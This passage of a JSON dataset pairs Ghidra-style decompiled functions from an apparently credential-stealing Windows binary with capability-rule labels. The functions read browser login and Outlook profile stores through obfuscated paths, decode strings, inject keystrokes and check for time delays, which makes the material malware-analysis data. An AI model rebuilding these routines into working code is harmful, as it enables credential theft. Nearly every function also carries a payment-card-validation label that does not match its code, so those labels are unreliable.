        "decompiled_code": "\nvoid fcn.0040b4bf(int32_t *param_1)\n\n{\n    if (*param_1 != 0) {\n        sub.msvcrt.dll_free(*param_1);\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 57
    },
    "0040b4ff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b4ff(uint param_1, uint param_2)\n\n{\n    sub.KERNEL32.dll_GetProcAddress(param_1, param_2);\n    return;\n}\n",
        "token_count": 41
    },
    "0040b959": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b959(uint param_1, uint param_2)\n\n{\n    fcn.00419918(param_1, 0x41ecda, param_2);\n    return;\n}\n",
        "token_count": 46
    },
    "0040b97c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.0040b97c(uint32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.00419d08(0x41e7a4);\n    return uVar1 & param_1 & 0xffffff00 | (uVar1 & param_1) == param_1;\n}\n",
        "token_count": 80
    },
    "0040c9af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040c9af(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uchar auStack1304 [516];\n    uchar auStack788 [260];\n    uchar auStack528 [528];\n    \n    cVar1 = fcn.0040b97c(8);\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.0040b60e(\"MT_qUDrj\\\\F4Y0W6W85\\\\U4RSWg6\\\\PQ00dR5zd064WR\\\\rQR\\\\\");\n        fcn.00416d52(0x80000001, uVar2, 0x41e6c4);\n    }\n    cVar1 = fcn.0040b97c(0x10);\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.0040b60e(\"MT_qUDrj\\\\F4Y0W6W85\\\\DY542d Md5Qs\\\\XR65CiidS PWlsWRdR56\");\n        fcn.00416dc5(0x80000002, uVar2, 0x41e6e0);\n    }\n    cVar1 = fcn.0040b97c(4);\n    if ((cVar1 != '\\0') && (*0x424460 != 0)) {\n        sub.msvcrt.dll_fclose(*0x424460);\n    }\n    cVar1 = fcn.0040af4f(auStack528, 0x204);\n    if (cVar1 == '\\x01') {\n        fcn.00419fa8(auStack788, 0x104, 0x41ee3a, auStack528, \"Settings.ini\");\n        cVar1 = fcn.0040aa34(auStack788);\n        if (cVar1 != '\\0') {\n            fcn.0040a9af(auStack788);\n        }\n        cVar1 = fcn.0040aed7(auStack1304, 0x204);\n        if (cVar1 == '\\x01') {\n            fcn.0040c38b(auStack1304, 3000);\n        }\n    }\n    return;\n}\n",
        "token_count": 494
    },
    "0040caf6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0040caf6(void)\n\n{\n    uint32_t uVar1;\n    \n    *0x41e7b0 = sub.KERNEL32.dll_CreateMutexA(0, 1, 0x41e62c);\n    if (*0x41e7b0 == 0) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = sub.KERNEL32.dll_GetLastError();\n        uVar1 = uVar1 & 0xffffff00 | uVar1 != 0xb7;\n    }\n    return uVar1;\n}\n",
        "token_count": 128
    },
    "0040cb70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040cb70(void)\n\n{\n    uchar auStack276 [276];\n    \n    fcn.004165ec(auStack276, 0x41e604, 0x10);\n    fcn.004168ad(auStack276, 0x41e3e0, 0xff);\n    fcn.004168ad(auStack276, 0x41e4e0, 0xff);\n    fcn.004168ad(auStack276, 0x41e5e0, 0x20);\n    fcn.004168ad(auStack276, 0x41e618, 0x10);\n    fcn.004168ad(auStack276, 0x41e62c, 8);\n    fcn.004168ad(auStack276, 0x41e640, 0x80);\n    fcn.004168ad(auStack276, 0x41e6c4, 0x10);\n    fcn.004168ad(auStack276, 0x41e6e0, 0x26);\n    fcn.004168ad(auStack276, 0x41e720, 0x80);\n    fcn.004168ad(auStack276, 0x41e7a4, 3);\n    fcn.004168ad(auStack276, 0x41e7a8, 3);\n    fcn.004168ad(auStack276, 0x41e7ac, 3);\n    return;\n}\n",
        "token_count": 343
    },
    "0040cf99": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040cf99(void)\n\n{\n    fcn.00419d08(0x41e7a8);\n    return;\n}\n",
        "token_count": 33
    },
    "0040cfac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040cfac(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00419d08(0x41e7ac);\n    return iVar1 * 1000;\n}\n",
        "token_count": 51
    },
    "0040d70c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040d70c(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t uStack4;\n    \n    for (uStack4 = 0; uStack4 < param_2; uStack4 = uStack4 + 1) {\n        *(param_1 + uStack4) = (*(uStack4 + param_1) ^ 0x9d) + 0x24;\n    }\n    return;\n}\n",
        "token_count": 103
    },
    "0040e76e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040e76e(uint param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    uchar auStack272 [272];\n    \n    cVar1 = fcn.0040b97c(0x40);\n    if (cVar1 == '\\x01') {\n        fcn.00419fa8(auStack272, 0x104, 0x41f2e7, 0x41e720, param_1);\n        uVar2 = fcn.0040ac70(auStack272);\n    }\n    else {\n        uVar2 = 0xffffffff;\n    }\n    return uVar2;\n}\n",
        "token_count": 145
    },
    "0040e7d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0040e7d0(uint8_t param_1, uint8_t param_2)\n\n{\n    return param_1 >> (8 - param_2 & 0x1f) | param_1 << (param_2 & 0x1f);\n}\n",
        "token_count": 64
    },
    "0040e813": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.0040e813(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint8_t auStack56 [32];\n    uint32_t uStack24;\n    uint8_t uStack17;\n    uint32_t uStack16;\n    \n    uStack24 = sub.msvcrt.dll_strlen(param_1);\n    for (uStack16 = 0; uStack16 < uStack24; uStack16 = uStack16 + 1) {\n        uVar2 = fcn.0040e7d0(*(param_1 + uStack16), 4);\n        auStack56[uStack16] = uVar2;\n    }\n    for (uStack16 = uStack24; uStack16 < 0x20; uStack16 = uStack16 + 1) {\n        uVar2 = fcn.0040e7d0(uStack16 & 0xff, 3);\n        auStack56[uStack16] = uStack16 & uVar2;\n    }\n    uStack17 = auStack56[uStack24 >> 2] ^ uStack24;\n    for (uStack16 = 0; uStack16 < 0x20; uStack16 = uStack16 + 1) {\n        *(uStack16 + param_3) = *(param_2 + uStack16) ^ auStack56[uStack16] ^ uStack17;\n        uStack17 = *(param_3 + uStack16) << 2 ^ ~*(param_2 + uStack16);\n        puVar1 = uStack16 + param_3;\n        uVar2 = fcn.0040e7d0(*(param_3 + uStack16), 3);\n        *puVar1 = uStack16 ^ uStack24 + uStack16 | uVar2;\n    }\n    return;\n}\n",
        "token_count": 424
    },
    "0040eac5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040eac5(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uchar auStack44 [44];\n    \n    fcn.0040e813(0x41e5e0, param_2, auStack44);\n    iVar1 = fcn.0040571b(0x4274a0, auStack44, 0x20);\n    if (iVar1 == 0) {\n        fcn.004057d1(0x4274a0, 0x427280, param_3, param_3, 0x10, 1);\n        iVar1 = fcn.0041a53c(param_3, 0x41e7cc, 0x10);\n        if (iVar1 == 0) {\n            *0x41e7c8 = param_1;\n            uVar2 = 1;\n        }\n        else {\n            fcn.00408b8f(param_1, 0x9a, 0, 0);\n            fcn.00405787(0x4274a0);\n            uVar2 = 0;\n        }\n    }\n    else {\n        fcn.00408d8a(&param_1);\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 301
    },
    "004105f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004105f4(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    for (iStack16 = 0; iStack16 < 9; iStack16 = iStack16 + 1) {\n        fcn.0040b51d(*(param_1 + iStack16 * 4));\n    }\n    for (iStack20 = 0; iStack20 < 0x2c; iStack20 = iStack20 + 1) {\n        fcn.0040b51d(*(param_2 + iStack20 * 4));\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "00411d55": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint32_t fcn.00411d55(uint param_1, uint param_2, uint param_3, uint param_4, uint *param_5)\n\n{\n    uint32_t uVar1;\n    \n    *param_5 = param_4;\n    uVar1 = sub.ADVAPI32.DLL_RegQueryValueExA(param_1, param_2, 0, 0, param_3, param_5);\n    return uVar1 & 0xffffff00 | uVar1 == 0;\n}\n",
        "token_count": 115
    },
    "00412f27": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00412f27(void)\n\n{\n    int32_t iStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    uint uStack36;\n    int32_t iStack32;\n    char *pcStack28;\n    char *pcStack24;\n    char *pcStack20;\n    int32_t iStack16;\n    \n    pcStack20 = \n    \"Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows Messaging Subsystem\\\\Profiles\\\\Outlook\\\\9375CFF0413111d3B88A00104B2A6676\"\n    ;\n    pcStack24 = \"Software\\\\Microsoft\\\\Office\\\\15.0\\\\Outlook\\\\Profiles\\\\Outlook\\\\9375CFF0413111d3B88A00104B2A6676\";\n    pcStack28 = \"Software\\\\Microsoft\\\\Office\\\\16.0\\\\Outlook\\\\Profiles\\\\Outlook\\\\9375CFF0413111d3B88A00104B2A6676\";\n    uStack36 = 0;\n    iStack16 = 0;\n    iStack40 = fcn.00411f98(\n                           \"Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows Messaging Subsystem\\\\Profiles\\\\Outlook\\\\9375CFF0413111d3B88A00104B2A6676\"\n                           );\n    if (iStack40 != 0) {\n        iStack32 = sub.msvcrt.dll_strlen(iStack40);\n        uStack36 = fcn.0041a022(&uStack36, iStack16, &iStack40, iStack32, 1);\n        iStack16 = iStack16 + iStack32;\n    }\n    iStack44 = fcn.00411f98(pcStack24);\n    if (iStack44 != 0) {\n        iStack32 = sub.msvcrt.dll_strlen(iStack44);\n        uStack36 = fcn.0041a022(&uStack36, iStack16, &iStack44, iStack32, 1);\n        iStack16 = iStack16 + iStack32;\n    }\n    iStack48 = fcn.00411f98(pcStack28);\n    if (iStack48 != 0) {\n        iStack32 = sub.msvcrt.dll_strlen(iStack48);\n        uStack36 = fcn.0041a022(&uStack36, iStack16, &iStack48, iStack32, 1);\n    }\n    return uStack36;\n}\n",
        "token_count": 539
    },
    "0041307a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0041307a(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iStack8;\n    int32_t iStack4;\n    \n    iStack4 = 0;\n    for (iStack8 = 0; iStack8 < param_2; iStack8 = iStack8 + 1) {\n        iStack4 = iStack4 + (*(param_1 + iStack8) << (iStack8 << 3 & 0x1f));\n    }\n    return iStack4;\n}\n",
        "token_count": 123
    },
    "004130c7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.004130c7(uint param_1, uint param_2, uint32_t param_3, int32_t param_4)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.0040b542(param_1, param_4, param_4 >> 0x1f, 0);\n    if (iVar1 == 0) {\n        uVar2 = sub.msvcrt.dll_fread(param_2, 1, param_3, param_1);\n        uVar2 = uVar2 & 0xffffff00 | uVar2 == param_3;\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 165
    },
    "00413591": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00413591(int32_t param_1, int32_t param_2, uint param_3, int32_t *param_4)\n\n{\n    int32_t iVar1;\n    int32_t iStack16;\n    \n    fcn.0041a59f(param_2, 0, param_3);\n    iVar1 = sub.msvcrt.dll_strlen(param_1);\n    *param_4 = (iVar1 + 1) * 2;\n    iStack16 = 0;\n    while( true ) {\n        iVar1 = sub.msvcrt.dll_strlen(param_1);\n        if (iVar1 <= iStack16) break;\n        *(iStack16 * 2 + param_2) = *(param_1 + iStack16);\n        iStack16 = iStack16 + 1;\n    }\n    return;\n}\n",
        "token_count": 184
    },
    "00414dea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00414dea(int32_t *param_1)\n\n{\n    int32_t iStack40;\n    int32_t iStack36;\n    int32_t iStack32;\n    int32_t iStack28;\n    int32_t iStack24;\n    uint uStack20;\n    int32_t iStack16;\n    \n    uStack20 = 0;\n    iStack16 = 0;\n    *param_1 = 0;\n    *0x4245c0 = 0;\n    iStack28 = fcn.0041379d();\n    if (iStack28 != 0) {\n        iStack24 = sub.msvcrt.dll_strlen(iStack28);\n        uStack20 = fcn.0041a022(&uStack20, iStack16, &iStack28, iStack24, 1);\n        iStack16 = iStack16 + iStack24;\n    }\n    iStack36 = 0;\n    iStack32 = fcn.004169e0(0x80000001, \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Shell Folders\", \n                            \"History\");\n    if (iStack32 != 0) {\n        fcn.00414109(iStack32, 0, &iStack36);\n        fcn.0040b4bf(&iStack32);\n    }\n    if (iStack36 != 0) {\n        iStack24 = sub.msvcrt.dll_strlen(iStack36);\n        uStack20 = fcn.0041a022(&uStack20, iStack16, &iStack36, iStack24, 1);\n        iStack16 = iStack16 + iStack24;\n    }\n    iStack40 = fcn.00414368(&iStack24);\n    if (iStack40 != 0) {\n        uStack20 = fcn.0041a022(&uStack20, iStack16, &iStack40, iStack24, 1);\n        iStack16 = iStack16 + iStack24;\n    }\n    *param_1 = iStack16;\n    return uStack20;\n}\n",
        "token_count": 456
    },
    "0041541b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0041541b(uint param_1, uint param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    bool bVar3;\n    int32_t iStack76;\n    int32_t iStack72;\n    int32_t iStack68;\n    uint uStack64;\n    uchar auStack60 [4];\n    char *pcStack56;\n    int32_t iStack52;\n    int32_t iStack48;\n    int32_t iStack44;\n    uint16_t uStack38;\n    int32_t iStack36;\n    int32_t iStack32;\n    char *pcStack28;\n    uint16_t uStack24;\n    int16_t iStack22;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    iStack48 = 0;\n    iStack52 = fcn.0040b30c(param_2, 0, &iStack48);\n    if ((iStack52 == 0) || (iStack48 < 1)) {\n        uStack64 = 0;\n    }\n    else {\n        pcStack56 = iStack52 + 0x10;\n        uStack24 = fcn.00414fee(&pcStack56);\n        pcStack28 = iStack52 + 100;\n        sub.msvcrt.dll_sprintf(auStack60, \"0x%02hhX\", *pcStack28);\n        sub.msvcrt.dll_printf(\"This is element 0: %s\\n\", auStack60);\n        iVar2 = sub.msvcrt.dll_strcmp(auStack60, \"0x0D\");\n        if ((iVar2 == 0) || (iVar2 = sub.msvcrt.dll_strcmp(auStack60, \"0x05\"),  iVar2 == 0)) {\n            uStack64 = 0;\n            iStack68 = 0;\n            iStack16 = 0;\n            iStack32 = iStack48 / uStack24;\n            for (iStack20 = 1; iStack20 < iStack32; iStack20 = iStack20 + 1) {\n                iStack36 = uStack24 * (iStack20 + -1);\n                pcStack56 = iStack36 + iStack52;\n                if (*pcStack56 == '\\r') {\n                    pcStack56 = pcStack56 + 3;\n                    iStack22 = fcn.00414fee(&pcStack56);\n                    uStack38 = fcn.00414fee(&pcStack56);\n                    pcStack56 = iStack52 + iStack36 + uStack38;\n                    iStack72 = 0;\n                    while( true ) {\n                        iStack44 = 0;\n                        iVar1 = iStack22 + -1;\n                        bVar3 = iStack22 == 0;\n                        iStack22 = iVar1;\n                        if (bVar3) break;\n                        iStack76 = 1;\n                        iStack44 = fcn.00414f74(pcStack56, &iStack76);\n                        if (10000 < iStack44) break;\n                        pcStack56 = pcStack56 + iStack76;\n                        fcn.00414f74(pcStack56, &iStack76);\n                        pcStack56 = pcStack56 + iStack76;\n                        iStack72 = fcn.00415034(param_1, pcStack56, &iStack68);\n                        if (iStack72 != 0) {\n                            uStack64 = fcn.0041a022(&uStack64, iStack16, &iStack72, iStack68, 1);\n                            iStack16 = iStack16 + iStack68;\n                        }\n                        pcStack56 = pcStack56 + iStack44;\n                    }\n                }\n            }\n        }\n        fcn.0040b4bf(&iStack52);\n    }\n    return uStack64;\n}\n",
        "token_count": 830
    },
    "004156c7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004156c7(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    uchar auStack528 [524];\n    \n    uVar2 = sub.msvcrt.dll_getenv(\"LOCALAPPDATA\");\n    uVar3 = fcn.0040b60e(\"%6\\\\EWWnid\\\\PI0Wld\\\\u6d0 aC5C\\\\ad8CQi5\\\\mWn4R aC5C\");\n    fcn.00419fa8(auStack528, 0x204, uVar3, uVar2);\n    cVar1 = fcn.0040aa34(auStack528);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.0041541b(4, auStack528);\n    }\n    return uVar2;\n}\n",
        "token_count": 201
    },
    "00415737": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00415737(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    uchar auStack528 [524];\n    \n    uVar2 = sub.msvcrt.dll_getenv(\"LOCALAPPDATA\");\n    uVar3 = fcn.0040b60e(\"%6\\\\PI0Wl4Ql\\\\u6d0 aC5C\\\\ad8CQi5\\\\mWn4R aC5C\");\n    fcn.00419fa8(auStack528, 0x204, uVar3, uVar2);\n    cVar1 = fcn.0040aa34(auStack528);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.0041541b(5, auStack528);\n    }\n    return uVar2;\n}\n",
        "token_count": 199
    },
    "004157a7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004157a7(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    uchar auStack528 [524];\n    \n    uVar2 = sub.msvcrt.dll_getenv(\"LOCALAPPDATA\");\n    uVar3 = fcn.0040b60e(\"%6\\\\PWlWSW\\\\a0CnWR\\\\u6d0 aC5C\\\\ad8CQi5\\\\mWn4R aC5C\");\n    fcn.00419fa8(auStack528, 0x204, uVar3, uVar2);\n    cVar1 = fcn.0040aa34(auStack528);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.0041541b(8, auStack528);\n    }\n    return uVar2;\n}\n",
        "token_count": 203
    },
    "00415817": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00415817(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    uchar auStack528 [524];\n    \n    uVar2 = sub.msvcrt.dll_getenv(\"LOCALAPPDATA\");\n    uVar3 = fcn.0040b60e(\"%6\\\\vCRSdf\\\\vCRSdfc0Wg6d0\\\\u6d0 aC5C\\\\ad8CQi5\\\\mWn4R aC5C\");\n    fcn.00419fa8(auStack528, 0x204, uVar3, uVar2);\n    cVar1 = fcn.0040aa34(auStack528);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.0041541b(9, auStack528);\n    }\n    return uVar2;\n}\n",
        "token_count": 208
    },
    "00415887": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00415887(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    uchar auStack528 [524];\n    \n    uVar2 = sub.msvcrt.dll_getenv(\"APPDATA\");\n    uVar3 = fcn.0040b60e(\"%6\\\\Tsd0C MW85gC0d\\\\Tsd0C M5CVid\\\\mWn4R aC5C\");\n    fcn.00419fa8(auStack528, 0x204, uVar3, uVar2);\n    cVar1 = fcn.0040aa34(auStack528);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.0041541b(7, auStack528);\n    }\n    return uVar2;\n}\n",
        "token_count": 195
    },
    "00416368": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00416368(void)\n\n{\n    sub.KERNEL32.dll_GetCurrentProcessId();\n    return;\n}\n",
        "token_count": 26
    },
    "004163d6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004163d6(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar1 = sub.KERNEL32.dll_GetTickCount();\n    uVar2 = sub.KERNEL32.dll_GetCurrentProcessId();\n    uVar3 = sub.KERNEL32.dll_GetCurrentThreadId();\n    uVar3 = uVar3 | uVar1 ^ uVar2;\n    uVar1 = *0x41e8e4 & uVar3;\n    uVar2 = fcn.00416374();\n    *0x41e8e0 = *0x41e8e0 ^ uVar1 ^ uVar2;\n    uVar3 = *0x41e8e0 | uVar3;\n    uVar1 = fcn.00416374();\n    *0x41e8e4 = *0x41e8e4 ^ uVar3 ^ uVar1;\n    return;\n}\n",
        "token_count": 214
    },
    "00416487": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00416487(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.00416439();\n    return param_1 + uVar1 % ((param_2 - param_1) + 1U);\n}\n",
        "token_count": 71
    },
    "004168ad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004168ad(uint param_1, uint param_2, uint param_3)\n\n{\n    fcn.004166e1(param_1, param_2, param_3, param_2, param_3);\n    return;\n}\n",
        "token_count": 56
    },
    "004176e3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004176e3(uint param_1, uint param_2, uint param_3)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint auStack544 [3];\n    uchar auStack529 [512];\n    uchar uStack17;\n    uint uStack16;\n    \n    uStack17 = 8;\n    uStack16 = fcn.00419fa8(auStack529, 0x200, \"%d\\a%s\\a\", param_2, param_3);\n    fcn.004195d4(auStack544, 0x10000);\n    fcn.0041972e(auStack544, auStack529, uStack16);\n    cVar1 = fcn.00417009(param_2, param_3, auStack544);\n    if (cVar1 == '\\0') {\n        fcn.00408b8f(param_1, 0xe6, 0, 0);\n    }\n    else {\n        fcn.0041972e(auStack544, &uStack17, 1);\n        fcn.00417151(param_2, param_3, auStack544);\n        uVar2 = fcn.00419910(auStack544);\n        fcn.00408b8f(param_1, 0xe5, auStack544[0], uVar2);\n    }\n    fcn.00419639(auStack544);\n    return;\n}\n",
        "token_count": 315
    },
    "00418352": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "write file on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00418352(uint param_1, uint param_2)\n\n{\n    uchar auStack16 [16];\n    \n    sub.KERNEL32.dll_WriteFile(*0x4245cc, param_1, param_2, auStack16, 0);\n    return;\n}\n",
        "token_count": 62
    },
    "004193b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004193b1(uchar param_1)\n\n{\n    sub.USER32.dll_keybd_event(param_1, 0, 0, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "004193e3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004193e3(uchar param_1)\n\n{\n    sub.USER32.dll_keybd_event(param_1, 0, 2, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "004195d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.004195d4(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll_malloc(param_2);\n    *param_1 = iVar1;\n    iVar1 = *param_1;\n    if (iVar1 != 0) {\n        fcn.0041a59f(*param_1, 0, param_2);\n        param_1[1] = param_2;\n        param_1[2] = 0;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 130
    },
    "00419639": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00419639(int32_t *param_1)\n\n{\n    if (*param_1 != 0) {\n        sub.msvcrt.dll_free(*param_1);\n        *param_1 = 0;\n    }\n    param_1[1] = 0;\n    param_1[2] = 0;\n    return;\n}\n",
        "token_count": 77
    },
    "004196c2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.004196c2(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll_realloc(*param_1, param_2 + 1);\n    *param_1 = iVar1;\n    iVar1 = *param_1;\n    if (iVar1 != 0) {\n        *(param_2 + *param_1) = 0;\n        param_1[1] = param_2;\n    }\n    else {\n        param_1[2] = 0;\n        param_1[1] = 0;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 149
    },
    "004197d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004197d0(uint param_1, uint *param_2)\n\n{\n    fcn.0041972e(param_1, *param_2, param_2[2]);\n    return;\n}\n",
        "token_count": 48
    },
    "00419c6b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00419c6b(char *param_1, char *param_2)\n\n{\n    char *pcVar1;\n    uint uVar2;\n    char *pcStack12;\n    char *pcStack8;\n    \n    pcStack8 = param_1;\n    while (pcVar1 = pcStack8,  pcStack12 = param_2,  *pcStack8 != '\\0') {\n        while (*pcStack8 == *pcStack12) {\n            pcStack8 = pcStack8 + 1;\n            pcStack12 = pcStack12 + 1;\n            if ((*pcStack8 == '\\0') || (*pcStack12 == '\\0')) break;\n        }\n        if (*pcStack12 == '\\0') break;\n        pcStack8 = pcVar1 + 1;\n    }\n    if (*pcVar1 == '\\0') {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 218
    },
    "00419ecc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
